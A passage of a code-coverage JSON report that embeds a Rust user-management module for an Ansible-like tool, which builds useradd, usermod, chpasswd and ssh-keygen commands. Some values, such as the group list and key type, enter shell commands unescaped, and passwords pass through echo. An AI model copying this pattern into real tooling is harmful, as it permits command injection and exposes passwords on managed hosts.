"line":189,"address":[28960508,28960443],"length":1,"stats":{"Line":2}},{"line":191,"address":[28960194],"length":1,"stats":{"Line":1}},{"line":194,"address":[28960239],"length":1,"stats":{"Line":1}},{"line":196,"address":[28960539,28960598,28960641],"length":1,"stats":{"Line":2}},{"line":197,"address":[28960664,28961010,28960619,28960650],"length":1,"stats":{"Line":0}},{"line":198,"address":[28960720,28961015,28960682],"length":1,"stats":{"Line":0}},{"line":199,"address":[28960996],"length":1,"stats":{"Line":0}},{"line":201,"address":[28960656],"length":1,"stats":{"Line":0}},{"line":204,"address":[28960633],"length":1,"stats":{"Line":1}},{"line":207,"address":[28960701],"length":1,"stats":{"Line":1}},{"line":208,"address":[28961082],"length":1,"stats":{"Line":0}},{"line":209,"address":[28961671,28961308],"length":1,"stats":{"Line":0}},{"line":214,"address":[28961270,28961354,28961666],"length":1,"stats":{"Line":0}},{"line":215,"address":[28961485],"length":1,"stats":{"Line":0}},{"line":221,"address":[28961047,28961100],"length":1,"stats":{"Line":2}},{"line":228,"address":[28960564],"length":1,"stats":{"Line":1}},{"line":229,"address":[28961846,28966200,28965833],"length":1,"stats":{"Line":2}},{"line":230,"address":[28965920,28965851],"length":1,"stats":{"Line":0}},{"line":231,"address":[28965957,28966069],"length":1,"stats":{"Line":0}},{"line":233,"address":[28965934,28965976],"length":1,"stats":{"Line":0}},{"line":235,"address":[28966754,28966078,28965978],"length":1,"stats":{"Line":0}},{"line":237,"address":[28965807],"length":1,"stats":{"Line":1}},{"line":240,"address":[28966271,28965870],"length":1,"stats":{"Line":2}},{"line":243,"address":[28966437,28966720],"length":1,"stats":{"Line":1}},{"line":244,"address":[28966694,28966599],"length":1,"stats":{"Line":0}},{"line":247,"address":[28966629],"length":1,"stats":{"Line":1}},{"line":251,"address":[28962214,28961890,28961832],"length":1,"stats":{"Line":2}},{"line":252,"address":[28965805,28961932,28962001],"length":1,"stats":{"Line":0}},{"line":254,"address":[28961864],"length":1,"stats":{"Line":1}},{"line":258,"address":[28962301,28961955],"length":1,"stats":{"Line":2}},{"line":259,"address":[28962467,28962396],"length":1,"stats":{"Line":2}},{"line":260,"address":[28962489],"length":1,"stats":{"Line":0}},{"line":265,"address":[28965722,28962426,28962674],"length":1,"stats":{"Line":2}},{"line":268,"address":[28962791,28965717],"length":1,"stats":{"Line":1}},{"line":270,"address":[28962972],"length":1,"stats":{"Line":1}},{"line":273,"address":[28963189],"length":1,"stats":{"Line":1}},{"line":274,"address":[28963356,28963618,28963266],"length":1,"stats":{"Line":0}},{"line":277,"address":[28963802,28963343],"length":1,"stats":{"Line":1}},{"line":278,"address":[28963669],"length":1,"stats":{"Line":0}},{"line":282,"address":[28963807,28963647],"length":1,"stats":{"Line":2}},{"line":283,"address":[28964486,28963978,28965344,28964119,28964895,28965285,28965090,28964288],"length":1,"stats":{"Line":8}},{"line":284,"address":[28964127,28964017,28964044,28965661],"length":1,"stats":{"Line":2}},{"line":285,"address":[28964186,28964296,28965643,28964213],"length":1,"stats":{"Line":2}},{"line":286,"address":[28964363,28964494,28964375,28965625],"length":1,"stats":{"Line":2}},{"line":287,"address":[28964903],"length":1,"stats":{"Line":1}},{"line":289,"address":[28964616,28964861,28964561],"length":1,"stats":{"Line":3}},{"line":291,"address":[28965595,28964981,28964970,28965098],"length":1,"stats":{"Line":2}},{"line":292,"address":[28965165,28965176,28965293,28965382,28965550],"length":1,"stats":{"Line":3}},{"line":295,"address":[28965401],"length":1,"stats":{"Line":1}},{"line":300,"address":[28947392],"length":1,"stats":{"Line":0}},{"line":304,"address":[28944384],"length":1,"stats":{"Line":0}},{"line":308,"address":[28944416],"length":1,"stats":{"Line":0}},{"line":312,"address":[28944432],"length":1,"stats":{"Line":0}},{"line":316,"address":[28952515,28958422,28947856],"length":1,"stats":{"Line":1}},{"line":321,"address":[28947970],"length":1,"stats":{"Line":1}},{"line":322,"address":[28958420,28948334,28948421],"length":1,"stats":{"Line":2}},{"line":323,"address":[28948689,28948594],"length":1,"stats":{"Line":2}},{"line":324,"address":[28948727],"length":1,"stats":{"Line":1}},{"line":325,"address":[28948824],"length":1,"stats":{"Line":1}},{"line":326,"address":[28948919,28949003,28958402],"length":1,"stats":{"Line":1}},{"line":328,"address":[28949060],"length":1,"stats":{"Line":3}},{"line":329,"address":[28949185,28958378,28949098],"length":1,"stats":{"Line":2}},{"line":330,"address":[28949330],"length":1,"stats":{"Line":1}},{"line":333,"address":[28949393],"length":1,"stats":{"Line":1}},{"line":334,"address":[28949428,28949493],"length":1,"stats":{"Line":0}},{"line":341,"address":[28958373,28949471,28949766],"length":1,"stats":{"Line":2}},{"line":344,"address":[28949986],"length":1,"stats":{"Line":1}},{"line":345,"address":[28950141,28950045,28958346],"length":1,"stats":{"Line":2}},{"line":348,"address":[28950377],"length":1,"stats":{"Line":1}},{"line":350,"address":[28950437,28957998,28950550,28950657],"length":1,"stats":{"Line":0}},{"line":351,"address":[31016681],"length":1,"stats":{"Line":0}},{"line":355,"address":[31017164,31017120,31017227,31017270,31017296,31017447,31017919],"length":1,"stats":{"Line":0}},{"line":356,"address":[31017350,31017713,31017478,31017207,31017257],"length":1,"stats":{"Line":0}},{"line":357,"address":[31017823,31018161,31017720,31017891,31018072],"length":1,"stats":{"Line":0}},{"line":358,"address":[31017930,31017278,31018104,31017904,31017859],"length":1,"stats":{"Line":0}},{"line":359,"address":[31018131],"length":1,"stats":{"Line":0}},{"line":360,"address":[31018154,31020080,31020094],"length":1,"stats":{"Line":0}},{"line":362,"address":[31017695],"length":1,"stats":{"Line":0}},{"line":366,"address":[28950876],"length":1,"stats":{"Line":0}},{"line":367,"address":[28951047,28950921],"length":1,"stats":{"Line":0}},{"line":368,"address":[28950979],"length":1,"stats":{"Line":0}},{"line":371,"address":[28950987],"length":1,"stats":{"Line":0}},{"line":373,"address":[28951128,28951227,28951058],"length":1,"stats":{"Line":0}},{"line":374,"address":[28951149],"length":1,"stats":{"Line":0}},{"line":375,"address":[28951232,28951267],"length":1,"stats":{"Line":0}},{"line":376,"address":[28951302],"length":1,"stats":{"Line":0}},{"line":378,"address":[28951259],"length":1,"stats":{"Line":0}},{"line":381,"address":[28951219],"length":1,"stats":{"Line":0}},{"line":384,"address":[28951370],"length":1,"stats":{"Line":0}},{"line":385,"address":[28951423],"length":1,"stats":{"Line":0}},{"line":386,"address":[28952521,28951656],"length":1,"stats":{"Line":0}},{"line":392,"address":[28951693,28951609],"length":1,"stats":{"Line":0}},{"line":393,"address":[28952513,28952055,28952139],"length":1,"stats":{"Line":0}},{"line":394,"address":[28951902],"length":1,"stats":{"Line":0}},{"line":395,"address":[28952032],"length":1,"stats":{"Line":0}},{"line":396,"address":[31018790,31018850],"length":1,"stats":{"Line":0}},{"line":401,"address":[28952315],"length":1,"stats":{"Line":0}},{"line":407,"address":[28951388,28951441],"length":1,"stats":{"Line":0}},{"line":414,"address":[28951086],"length":1,"stats":{"Line":0}},{"line":415,"address":[28957023,28957335,28952696],"length":1,"stats":{"Line":0}},{"line":416,"address":[28957025],"length":1,"stats":{"Line":0}},{"line":417,"address":[28957213,28957954,28957146],"length":1,"stats":{"Line":0}},{"line":419,"address":[28956997],"length":1,"stats":{"Line":0}},{"line":422,"address":[28957100,28957406],"length":1,"stats":{"Line":0}},{"line":425,"address":[28957855,28957572],"length":1,"stats":{"Line":0}},{"line":426,"address":[28957829,28957734],"length":1,"stats":{"Line":0}},{"line":429,"address":[28957764],"length":1,"stats":{"Line":0}},{"line":433,"address":[28952740,28952682,28953756],"length":1,"stats":{"Line":0}},{"line":434,"address":[28952789,28952850],"length":1,"stats":{"Line":0}},{"line":435,"address":[28953009,28953093],"length":1,"stats":{"Line":0}},{"line":436,"address":[28953481,28953397],"length":1,"stats":{"Line":0}},{"line":437,"address":[28953244],"length":1,"stats":{"Line":0}},{"line":438,"address":[31016864,31017099],"length":1,"stats":{"Line":0}},{"line":439,"address":[31016946,31016886],"length":1,"stats":{"Line":0}},{"line":441,"address":[28953649],"length":1,"stats":{"Line":0}},{"line":443,"address":[28952714],"length":1,"stats":{"Line":0}},{"line":455,"address":[28954205,28954289],"length":1,"stats":{"Line":0}},{"line":456,"address":[28953967],"length":1,"stats":{"Line":0}},{"line":457,"address":[31019913,31019485,31019727,31019360],"length":1,"stats":{"Line":0}},{"line":458,"address":[31019695,31019408,31019352,31019786,31019740,31019945],"length":1,"stats":{"Line":0}},{"line":460,"address":[28954182],"length":1,"stats":{"Line":0}},{"line":461,"address":[31019046,31019106],"length":1,"stats":{"Line":0}},{"line":464,"address":[28954322],"length":1,"stats":{"Line":0}},{"line":467,"address":[28954539],"length":1,"stats":{"Line":0}},{"line":468,"address":[28954616,28954789,28955051],"length":1,"stats":{"Line":0}},{"line":472,"address":[28955121,28955058,28954716],"length":1,"stats":{"Line":0}},{"line":473,"address":[28956179,28956014,28955486,28955169,28956344,28956403,28955651,28955317],"length":1,"stats":{"Line":0}},{"line":474,"address":[28955325,28955215,28955242,28956608],"length":1,"stats":{"Line":0}},{"line":475,"address":[28955384,28956590,28955411,28955494],"length":1,"stats":{"Line":0}},{"line":476,"address":[28955569,28955576,28956575,28955659],"length":1,"stats":{"Line":0}},{"line":477,"address":[28956022],"length":1,"stats":{"Line":0}},{"line":479,"address":[28955812,28955718,28955980],"length":1,"stats":{"Line":0}},{"line":481,"address":[28956104,28956187,28956081,28956545],"length":1,"stats":{"Line":0}},{"line":482,"address":[28956246,28956352,28956503,28956441,28956269],"length":1,"stats":{"Line":0}},{"line":485,"address":[28956633],"length":1,"stats":{"Line":0}},{"line":491,"address":[28950464],"length":1,"stats":{"Line":1}},{"line":495,"address":[28958056],"length":1,"stats":{"Line":1}},{"line":501,"address":[28947424,28947824,28947830],"length":1,"stats":{"Line":1}},{"line":506,"address":[28947760],"length":1,"stats":{"Line":1}},{"line":509,"address":[28944464,28946934,28947370],"length":1,"stats":{"Line":0}},{"line":510,"address":[28944529],"length":1,"stats":{"Line":0}},{"line":511,"address":[28944786,28947368,28944873],"length":1,"stats":{"Line":0}},{"line":512,"address":[28945046,28945129],"length":1,"stats":{"Line":0}},{"line":513,"address":[28945161],"length":1,"stats":{"Line":0}},{"line":514,"address":[28945237],"length":1,"stats":{"Line":0}},{"line":516,"address":[28945288],"length":1,"stats":{"Line":0}},{"line":517,"address":[28945376,28945317],"length":1,"stats":{"Line":0}},{"line":523,"address":[28945633,28947347,28945354],"length":1,"stats":{"Line":0}},{"line":524,"address":[28945820],"length":1,"stats":{"Line":0}},{"line":525,"address":[28947320,28945963,28945879],"length":1,"stats":{"Line":0}},{"line":528,"address":[28946204],"length":1,"stats":{"Line":0}},{"line":529,"address":[28946258,28946358,28946465],"length":1,"stats":{"Line":0}},{"line":530,"address":[31013481],"length":1,"stats":{"Line":0}},{"line":533,"address":[28946553],"length":1,"stats":{"Line":0}},{"line":534,"address":[31013751,31013894,31014022,31013801],"length":1,"stats":{"Line":0}},{"line":535,"address":[31014259,31014613,31014729,31014364,31014432],"length":1,"stats":{"Line":0}},{"line":536,"address":[31014445,31014400,31013822,31014645,31014471],"length":1,"stats":{"Line":0}},{"line":537,"address":[31014672],"length":1,"stats":{"Line":0}},{"line":538,"address":[31014695,31014736,31014750],"length":1,"stats":{"Line":0}},{"line":539,"address":[31014702],"length":1,"stats":{"Line":0}},{"line":541,"address":[31014247,31014279],"length":1,"stats":{"Line":0}},{"line":545,"address":[28946667],"length":1,"stats":{"Line":0}},{"line":548,"address":[28946993,28946287],"length":1,"stats":{"Line":0}},{"line":549,"address":[28947164,28947024],"length":1,"stats":{"Line":0}},{"line":551,"address":[28947043,28947007],"length":1,"stats":{"Line":0}},{"line":554,"address":[28947045,28947173],"length":1,"stats":{"Line":0}}],"covered":84,"coverable":248},{"path":["/","home","artur","Repositories","rustible","src","modules","user.rs"],"content":"//! User module - User management\n//!\n//! This module manages user accounts on the system.\n\nuse super::{\n    Diff, Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParamExt,\n};\nuse crate::connection::{Connection, ExecuteOptions};\nuse std::collections::HashMap;\nuse std::sync::Arc;\nuse tokio::runtime::Handle;\n\n/// Desired state for a user\n#[derive(Debug, Clone, PartialEq)]\npub enum UserState {\n    Present,\n    Absent,\n}\n\nimpl UserState {\n    fn from_str(s: \u0026str) -\u003e ModuleResult\u003cSelf\u003e {\n        match s.to_lowercase().as_str() {\n            \"present\" =\u003e Ok(UserState::Present),\n            \"absent\" =\u003e Ok(UserState::Absent),\n            _ =\u003e Err(ModuleError::InvalidParameter(format!(\n                \"Invalid state '{}'. Valid states: present, absent\",\n                s\n            ))),\n        }\n    }\n}\n\n/// Information about a user\n#[derive(Debug, Clone)]\npub struct UserInfo {\n    pub name: String,\n    pub uid: u32,\n    pub gid: u32,\n    pub comment: String,\n    pub home: String,\n    pub shell: String,\n    pub groups: Vec\u003cString\u003e,\n}\n\n/// Module for user management\npub struct UserModule;\n\nimpl UserModule {\n    /// Get execution options with become support if needed\n    fn get_exec_options(context: \u0026ModuleContext) -\u003e ExecuteOptions {\n        let mut options = ExecuteOptions::new();\n        if context.r#become {\n            options = options.with_escalation(context.become_user.clone());\n            if let Some(ref method) = context.become_method {\n                options.escalate_method = Some(method.clone());\n            }\n        }\n        options\n    }\n\n    /// Execute a command via connection or locally\n    fn execute_command(\n        connection: \u0026Arc\u003cdyn Connection + Send + Sync\u003e,\n        command: \u0026str,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003c(bool, String, String)\u003e {\n        let options = Self::get_exec_options(context);\n\n        // Use tokio runtime to execute async command\n        let result = Handle::current()\n            .block_on(async { connection.execute(command, Some(options)).await })\n            .map_err(|e| ModuleError::ExecutionFailed(format!(\"Connection error: {}\", e)))?;\n\n        Ok((result.success, result.stdout, result.stderr))\n    }\n\n    /// Check if a user exists via connection\n    fn user_exists_via_connection(\n        connection: \u0026Arc\u003cdyn Connection + Send + Sync\u003e,\n        name: \u0026str,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        let command = format!(\"id {}\", shell_escape(name));\n        let (success, _, _) = Self::execute_command(connection, \u0026command, context)?;\n        Ok(success)\n    }\n\n    /// Get user info via connection by parsing /etc/passwd and groups\n    fn get_user_info_via_connection(\n        connection: \u0026Arc\u003cdyn Connection + Send + Sync\u003e,\n        name: \u0026str,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cOption\u003cUserInfo\u003e\u003e {\n        // Use getent to get passwd info\n        let command = format!(\"getent passwd {}\", shell_escape(name));\n        let (success, stdout, _) = Self::execute_command(connection, \u0026command, context)?;\n\n        if !success || stdout.trim().is_empty() {\n            return Ok(None);\n        }\n\n        // Parse passwd line: name:x:uid:gid:comment:home:shell\n        let parts: Vec\u003c\u0026str\u003e = stdout.trim().split(':').collect();\n        if parts.len() \u003c 7 {\n            return Err(ModuleError::ExecutionFailed(format!(\n                \"Invalid passwd entry for user '{}'\",\n                name\n            )));\n        }\n\n        let uid = parts[2].parse().unwrap_or(0);\n        let gid = parts[3].parse().unwrap_or(0);\n\n        // Get user's groups\n        let groups_cmd = format!(\"groups {}\", shell_escape(name));\n        let (groups_success, groups_stdout, _) =\n            Self::execute_command(connection, \u0026groups_cmd, context)?;\n\n        let groups = if groups_success {\n            groups_stdout\n                .split(':')\n                .last()\n                .unwrap_or(\"\")\n                .split_whitespace()\n                .map(|s| s.to_string())\n                .collect()\n        } else {\n            Vec::new()\n        };\n\n        Ok(Some(UserInfo {\n            name: parts[0].to_string(),\n            uid,\n            gid,\n            comment: parts[4].to_string(),\n            home: parts[5].to_string(),\n            shell: parts[6].to_string(),\n            groups,\n        }))\n    }\n\n    /// Create a user via connection\n    fn create_user_via_connection(\n        connection: \u0026Arc\u003cdyn Connection + Send + Sync\u003e,\n        name: \u0026str,\n        uid: Option\u003cu32\u003e,\n        group: Option\u003c\u0026str\u003e,\n        groups: Option\u003c\u0026[String]\u003e,\n        home: Option\u003c\u0026str\u003e,\n        shell: Option\u003c\u0026str\u003e,\n        comment: Option\u003c\u0026str\u003e,\n        create_home: bool,\n        system: bool,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003c()\u003e {\n        let mut cmd_parts = vec![\"useradd\".to_string()];\n\n        if let Some(uid) = uid {\n            cmd_parts.push(\"-u\".to_string());\n            cmd_parts.push(uid.to_string());\n        }\n\n        if let Some(group) = group {\n            cmd_parts.push(\"-g\".to_string());\n            cmd_parts.push(shell_escape(group));\n        }\n\n        if let Some(groups) = groups {\n            if !groups.is_empty() {\n                cmd_parts.push(\"-G\".to_string());\n                cmd_parts.push(groups.join(\",\"));\n            }\n        }\n\n        if let Some(home) = home {\n            cmd_parts.push(\"-d\".to_string());\n            cmd_parts.push(shell_escape(home));\n        }\n\n        if let Some(shell) = shell {\n            cmd_parts.push(\"-s\".to_string());\n            cmd_parts.push(shell_escape(shell));\n        }\n\n        if let Some(comment) = comment {\n            cmd_parts.push(\"-c\".to_string());\n            cmd_parts.push(format!(\"'{}'\", comment.replace('\\'', \"'\\\\''\")));\n        }\n\n        if create_home {\n            cmd_parts.push(\"-m\".to_string());\n        } else {\n            cmd_parts.push(\"-M\".to_string());\n        }\n\n        if system {\n            cmd_parts.push(\"-r\".to_string());\n        }\n\n        cmd_parts.push(shell_escape(name));\n\n        let command = cmd_parts.join(\" \");\n        let (success, _, stderr) = Self::execute_command(connection, \u0026command, context)?;\n\n        if success {\n            Ok(())\n        } else {\n            Err(ModuleError::ExecutionFailed(stderr))\n        }\n    }\n\n    /// Modify a user via connection\n    fn modify_user_via_connection(\n        connection: \u0026Arc\u003cdyn Connection + Send + Sync\u003e,\n        name: \u0026str,\n        uid: Option\u003cu32\u003e,\n        group: Option\u003c\u0026str\u003e,\n        groups: Option\u003c\u0026[String]\u003e,\n        append_groups: bool,\n        home: Option\u003c\u0026str\u003e,\n        shell: Option\u003c\u0026str\u003e,\n        comment: Option\u003c\u0026str\u003e,\n        move_home: bool,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        let current = Self::get_user_info_via_connection(connection, name, context)?\n            .ok_or_else(|| ModuleError::ExecutionFailed(format!(\"User '{}' not found\", name)))?;\n\n        let mut needs_change = false;\n        let mut cmd_parts = vec![\"usermod\".to_string()];\n\n        if let Some(uid) = uid {\n            if current.uid != uid {\n                cmd_parts.push(\"-u\".to_string());\n                cmd_parts.push(uid.to_string());\n                needs_change = true;\n            }\n        }\n\n        if let Some(group) = group {\n            cmd_parts.push(\"-g\".to_string());\n            cmd_parts.push(shell_escape(group));\n            needs_change = true;\n        }\n\n        if let Some(groups) = groups {\n            if !groups.is_empty() {\n                let groups_str = groups.join(\",\");\n                if append_groups {\n                    cmd_parts.push(\"-a\".to_string());\n                    cmd_parts.push(\"-G\".to_string());\n                    cmd_parts.push(groups_str);\n                } else {\n                    cmd_parts.push(\"-G\".to_string());\n                    cmd_parts.push(groups_str);\n                }\n                needs_change = true;\n            }\n        }\n\n        if let Some(home) = home {\n            if current.home != home {\n                cmd_parts.push(\"-d\".to_string());\n                cmd_parts.push(shell_escape(home));\n                if move_home {\n                    cmd_parts.push(\"-m\".to_string());\n                }\n                needs_change = true;\n            }\n        }\n\n        if let Some(shell) = shell {\n            if current.shell != shell {\n                cmd_parts.push(\"-s\".to_string());\n                cmd_parts.push(shell_escape(shell));\n                needs_change = true;\n            }\n        }\n\n        if let Some(comment) = comment {\n            if current.comment != comment {\n                cmd_parts.push(\"-c\".to_string());\n                cmd_parts.push(format!(\"'{}'\", comment.replace('\\'', \"'\\\\''\")));\n                needs_change = true;\n            }\n        }\n\n        if !needs_change {\n            return Ok(false);\n        }\n\n        cmd_parts.push(shell_escape(name));\n\n        let command = cmd_parts.join(\" \");\n        let (success, _, stderr) = Self::execute_command(connection, \u0026command, context)?;\n\n        if success {\n            Ok(true)\n        } else {\n            Err(ModuleError::ExecutionFailed(stderr))\n        }\n    }\n\n    /// Delete a user via connection\n    fn delete_user_via_connection(\n        connection: \u0026Arc\u003cdyn Connection + Send + Sync\u003e,\n        name: \u0026str,\n        remove_home: bool,\n        force: bool,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003c()\u003e {\n        let mut cmd_parts = vec![\"userdel\".to_string()];\n\n        if remove_home {\n            cmd_parts.push(\"-r\".to_string());\n        }\n\n        if force {\n            cmd_parts.push(\"-f\".to_string());\n        }\n\n        cmd_parts.push(shell_escape(name));\n\n        let command = cmd_parts.join(\" \");\n        let (success, _, stderr) = Self::execute_command(connection, \u0026command, context)?;\n\n        if success {\n            Ok(())\n        } else {\n            Err(ModuleError::ExecutionFailed(stderr))\n        }\n    }\n\n    /// Set password via connection\n    fn set_password_via_connection(\n        connection: \u0026Arc\u003cdyn Connection + Send + Sync\u003e,\n        name: \u0026str,\n        password: \u0026str,\n        encrypted: bool,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003c()\u003e {\n        // Use chpasswd with echo pipe\n        let flag = if encrypted { \"-e\" } else { \"\" };\n        let command = format!(\n            \"echo '{}:{}' | chpasswd {}\",\n            shell_escape(name),\n            password.replace('\\'', \"'\\\\''\"),\n            flag\n        );\n\n        let (success, _, stderr) = Self::execute_command(connection, \u0026command, context)?;\n\n        if success {\n            Ok(())\n        } else {\n            Err(ModuleError::ExecutionFailed(format!(\n                \"Failed to set password: {}\",\n                stderr\n            )))\n        }\n    }\n\n    /// Generate SSH key via connection\n    fn generate_ssh_key_via_connection(\n        connection: \u0026Arc\u003cdyn Connection + Send + Sync\u003e,\n        name: \u0026str,\n        ssh_key_type: \u0026str,\n        ssh_key_bits: u32,\n        ssh_key_file: Option\u003c\u0026str\u003e,\n        ssh_key_comment: Option\u003c\u0026str\u003e,\n        ssh_key_passphrase: Option\u003c\u0026str\u003e,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        // Get user info to find home directory\n        let user_info = Self::get_user_info_via_connection(connection, name, context)?\n            .ok_or_else(|| ModuleError::ExecutionFailed(format!(\"User '{}' not found\", name)))?;\n\n        let key_file = ssh_key_file\n            .map(|s| s.to_string())\n            .unwrap_or_else(|| format!(\"{}/.ssh/id_{}\", user_info.home, ssh_key_type));\n\n        // Check if key already exists\n        let check_cmd = format!(\"test -f {}\", shell_escape(\u0026key_file));\n        let (exists, _, _) = Self::execute_command(connection, \u0026check_cmd, context)?;\n        if exists {\n            return Ok(false);\n        }\n\n        // Create .ssh directory if needed\n        let ssh_dir = format!(\"{}/.ssh\", user_info.home);\n        let mkdir_cmd = format!(\n            \"mkdir -p {} \u0026\u0026 chown {}:{} {} \u0026\u0026 chmod 700 {}\",\n            shell_escape(\u0026ssh_dir),\n            user_info.uid,\n            user_info.gid,\n            shell_escape(\u0026ssh_dir),\n            shell_escape(\u0026ssh_dir)\n        );\n        Self::execute_command(connection, \u0026mkdir_cmd, context)?;\n\n        // Generate SSH key\n        let passphrase = ssh_key_passphrase.unwrap_or(\"\");\n        let comment_arg = ssh_key_comment\n            .map(|c| format!(\"-C '{}'\", c.replace('\\'', \"'\\\\''\")))\n            .unwrap_or_default();\n\n        let keygen_cmd = format!(\n            \"ssh-keygen -t {} -b {} -f {} {} -N '{}'\",\n            ssh_key_type,\n            ssh_key_bits,\n            shell_escape(\u0026key_file),\n            comment_arg,\n            passphrase.replace('\\'', \"'\\\\''\")\n        );\n\n        let (success, _, stderr) = Self::execute_command(connection, \u0026keygen_cmd, context)?;\n        if !success {\n            return Err(ModuleError::ExecutionFailed(format!(\n                \"Failed to generate SSH key: {}\",\n                stderr\n            )));\n        }\n\n        // Set ownership and permissions\n        let perms_cmd = format!(\n            \"chown {}:{} {} {}.pub \u0026\u0026 chmod 600 {} \u0026\u0026 chmod 644 {}.pub\",\n            user_info.uid,\n            user_info.gid,\n            shell_escape(\u0026key_file),\n            shell_escape(\u0026key_file),\n            shell_escape(\u0026key_file),\n            shell_escape(\u0026key_file)\n        );\n        Self::execute_command(connection, \u0026perms_cmd, context)?;\n\n        Ok(true)\n    }\n}\n\nimpl Module for UserModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"user\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Manage user accounts\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::RemoteCommand\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        \u0026[\"name\"]\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let connection = context.connection.as_ref().ok_or_else(|| {\n            ModuleError::ExecutionFailed(\n                \"User module requires a connection for remote execution\".to_string(),\n            )\n        })?;\n\n        let name = params.get_string_required(\"name\")?;\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = UserState::from_str(\u0026state_str)?;\n\n        let uid = params.get_u32(\"uid\")?;\n        let group = params.get_string(\"group\")?;\n        let groups = params.get_vec_string(\"groups\")?;\n        let append_groups = params.get_bool_or(\"append\", false);\n        let home = params.get_string(\"home\")?;\n        let shell = params.get_string(\"shell\")?;\n        let comment = params.get_string(\"comment\")?;\n        let create_home = params.get_bool_or(\"create_home\", true);\n        let move_home = params.get_bool_or(\"move_home\", false);\n        let system = params.get_bool_or(\"system\", false);\n        let remove_home = params.get_bool_or(\"remove\", false);\n        let force = params.get_bool_or(\"force\", false);\n        let password = params.get_string(\"password\")?;\n        let password_encrypted = params.get_bool_or(\"password_encrypted\", true);\n        let generate_ssh_key = params.get_bool_or(\"generate_ssh_key\", false);\n        let ssh_key_type = params\n            .get_string(\"ssh_key_type\")?\n            .unwrap_or_else(|| \"rsa\".to_string());\n        let ssh_key_bits = params.get_u32(\"ssh_key_bits\")?.unwrap_or(4096);\n        let ssh_key_file = params.get_string(\"ssh_key_file\")?;\n        let ssh_key_comment = params.get_string(\"ssh_key_comment\")?;\n        let ssh_key_passphrase = params.get_string(\"ssh_key_passphrase\")?;\n\n        let user_exists = Self::user_exists_via_connection(connection, \u0026name, context)?;\n\n        match state {\n            UserState::Absent =\u003e {\n                if !user_exists {\n                    return Ok(ModuleOutput::ok(format!(\"User '{}' already absent\", name)));\n                }\n\n                if context.check_mode {\n                    return Ok(ModuleOutput::changed(format!(\n                        \"Would remove user '{}'\",\n                        name\n                    )));\n                }\n\n                Self::delete_user_via_connection(connection, \u0026name, remove_home, force, context)?;\n                Ok(ModuleOutput::changed(format!(\"Removed user '{}'\", name)))\n            }\n\n            UserState::Present =\u003e {\n                let mut changed = false;\n                let mut messages = Vec::new();\n\n                if !user_exists {\n                    if context.check_mode {\n                        return Ok(ModuleOutput::changed(format!(\n                            \"Would create user '{}'\",\n                            name\n                        )));\n                    }\n\n                    Self::create_user_via_connection(\n                        connection,\n                        \u0026name,\n                        uid,\n                        group.as_deref(),\n                        groups.as_deref(),\n                        home.as_deref(),\n                        shell.as_deref(),\n                        comment.as_deref(),\n                        create_home,\n                        system,\n                        context,\n                    )?;\n\n                    changed = true;\n                    messages.push(format!(\"Created user '{}'\", name));\n                } else {\n                    // Modify existing user\n                    if context.check_mode {\n                        return Ok(ModuleOutput::changed(format!(\n                            \"Would modify user '{}'\",\n                            name\n                        )));\n                    }\n\n                    let modified = Self::modify_user_via_connection(\n                        connection,\n                        \u0026name,\n                        uid,\n                        group.as_deref(),\n                        groups.as_deref(),\n                        append_groups,\n                        home.as_deref(),\n                        shell.as_deref(),\n                        comment.as_deref(),\n                        move_home,\n                        context,\n                    )?;\n\n                    if modified {\n                        changed = true;\n                        messages.push(format!(\"Modified user '{}'\", name));\n                    }\n                }\n\n                // Set password if provided\n                if let Some(ref pwd) = password {\n                    if context.check_mode {\n                        messages.push(\"Would set password\".to_string());\n                        changed = true;\n                    } else {\n                        Self::set_password_via_connection(\n                            connection,\n                            \u0026name,\n                            pwd,\n                            password_encrypted,\n                            context,\n                        )?;\n                        messages.push(\"Set password\".to_string());\n                        changed = true;\n                    }\n                }\n\n                // Generate SSH key if requested\n                if generate_ssh_key {\n                    if context.check_mode {\n                        messages.push(\"Would generate SSH key\".to_string());\n                        changed = true;\n                    } else {\n                        let key_generated = Self::generate_ssh_key_via_connection(\n                            connection,\n                            \u0026name,\n                            \u0026ssh_key_type,\n                            ssh_key_bits,\n                            ssh_key_file.as_deref(),\n                            ssh_key_comment.as_deref(),\n                            ssh_key_passphrase.as_deref(),\n                            context,\n                        )?;\n\n                        if key_generated {\n                            messages.push(\"Generated SSH key\".to_string());\n                            changed = true;\n                        }\n                    }\n                }\n\n                // Get final user info\n                let user_info = Self::get_user_info_via_connection(connection, \u0026name, context)?;\n                let mut data = HashMap::new();\n\n                if let Some(info) = user_info {\n                    data.insert(\"uid\".to_string(), serde_json::json!(info.uid));\n                    data.insert(\"gid\".to_string(), serde_json::json!(info.gid));\n                    data.insert(\"home\".to_string(), serde_json::json!(info.home));\n                    data.insert(\"shell\".to_string(), serde_json::json!(info.shell));\n                    data.insert(\"groups\".to_string(), serde_json::json!(info.groups));\n                }\n\n                let msg = if messages.is_empty() {\n                    format!(\"User '{}' is in desired state\", name)\n                } else {\n                    messages.join(\". \")\n                };\n\n                let mut output = if changed {\n                    ModuleOutput::changed(msg)\n                } else {\n                    ModuleOutput::ok(msg)\n                };\n\n                for (k, v) in data {\n                    output = output.with_data(k, v);\n                }\n\n                Ok(output)\n            }\n        }\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let check_context = ModuleContext {\n            check_mode: true,\n            